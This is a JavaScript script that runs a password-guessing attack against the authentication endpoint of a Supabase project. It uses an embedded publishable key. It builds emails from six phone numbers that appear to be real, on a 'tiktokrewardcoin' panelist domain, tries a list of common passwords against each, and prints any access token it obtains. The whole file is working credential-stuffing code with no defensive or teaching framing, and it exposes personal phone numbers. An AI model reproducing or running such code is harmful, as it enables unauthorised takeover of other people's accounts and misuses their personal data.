const supabaseUrl = "https://ygzzerqlcjeroktvuvho.supabase.co";
const anonKey = "sb_publishable_MEc3tqGPZEF4aCGkYbtzHQ_QOdO7dqY";

async function run() {
  const phones = ["27676140455", "27679620410", "27833693805", "27677672672", "27839481558", "27728517859"];
  const passwords = ["123456", "password", "password123", "27676140455", "0676140455", "admin123", "secret"];

  for (const phone of phones) {
    const email = `${phone}@panelist.tiktokrewardcoin.com`;
    for (const pwd of passwords) {
      const res = await fetch(`${supabaseUrl}/auth/v1/token?grant_type=password`, {
        method: "POST",
        headers: {
          apikey: anonKey,
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ email, password: pwd }),
      });
      if (res.ok) {
        const data = await res.json();
        console.log(`SUCCESS! Logged in with ${email} / ${pwd}`);
        console.log("Access token:", data.access_token);
        return data.access_token;
      }
    }
  }
  console.log("No simple password matched.");
}

run();
